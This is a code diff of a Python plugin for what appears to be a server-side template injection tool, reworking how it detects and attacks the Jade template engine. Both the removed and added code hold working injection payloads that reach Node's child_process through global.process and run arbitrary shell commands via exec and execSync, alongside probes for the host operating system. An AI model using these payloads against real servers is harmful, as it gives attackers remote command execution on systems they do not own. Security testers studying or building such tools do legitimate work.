@@ -4,78 +4,38 @@ from utils import rand
 import string
 
 class Jade(Check):
-    
-    def detect(self):
-        
-        # Declare payload
-        self.base_tag = '= %s'
-        
-        self.req_header_rand = str(rand.randint_n(4))
-        self.req_trailer_rand = str(rand.randint_n(4))
-        
-        # Skip reflection check if same tag has been detected before
-        if self.get('reflect_tag') != self.base_tag:
-            self._check_engine()
-        
-        self._check_engine()
-    
-        # Return if reflect_tag is not set
-        if not self.get('reflect_tag'):
-            return
-            
-        log.warn('Reflection detected')
-        log.warn('Jade engine detected')
 
-        # I've tested the techniques described in this article
-        # http://blog.portswigger.net/2015/08/server-side-template-injection.html
-        # for it didn't work. Still keeping the check active to cover previous
-        # affected versions.
+    render_tag = '\n= %(payload)s\n'
+    header_tag = '\n= %(header)s\n'
+    trailer_tag = '\n= %(trailer)s\n'
+    contexts = [ ]
 
-        self._check_os()
+    def detect_engine(self):
         
-        if not self.get('exec'):
-            return
-            
-        log.warn(
-            'Shell command execution detected on \'%s\' operating system' % (
-                self.get('os', 'undetected')
-            )
-        )
+        execution_code = """- var x = global.process
+- x = x.mainModule.require
+- x = x('os')
+= x.platform()
+"""
+        self.set('os', self.inject(execution_code))
+        self.set('language', 'javascript')
+        self.set('eval', 'javascript')
+        self.set('engine', 'jade')
+        
+    def detect_exec(self):
 
-    def _check_engine(self):
-        
-        randA = rand.randint_n(1)
-        randB = rand.randint_n(1)
-
-        payload = '= %s*%s' % (randA, randB)
-        expected = str(randA*randB)
-        
-        if expected == self.req(payload):
-            self.set('reflect_tag', self.base_tag)
-            self.set('language', 'nodejs')
-            self.set('engine', 'jade')
-                      
-    def _check_os(self):
-    
         expected_rand = str(rand.randint_n(2))
-        
-        payload = """- var x = root.process
+
+        if expected_rand == self.execute('echo %s' % expected_rand):
+            self.set('exec', True)
+
+    def execute(self, command):
+
+        execution_code = """- var x = global.process
 - x = x.mainModule.require
 - x = x('child_process')
-= x.exec('echo %s')""" % expected_rand
-        
-        if expected_rand == self.req(payload):
-            self.set('exec', True)      
-               
+= x.execSync('%s')
+""" % command
 
-    def req(self, payload):
-        
-        rand_header = str(rand.randint_n(4))      
-        rand_trailer = str(rand.randint_n(4))
-        req_header = """\n= %s\n""" % (rand_header)
-        req_trailer = """\n= %s\n""" % (rand_trailer)
-        
-        response = self.channel.req(req_header + payload + req_trailer)
-        before,_,result = response.partition(rand_header)
-        result,_,after = result.partition(rand_trailer)
-        return result.strip()
+        # TODO: quote command
+        return self.inject(execution_code)
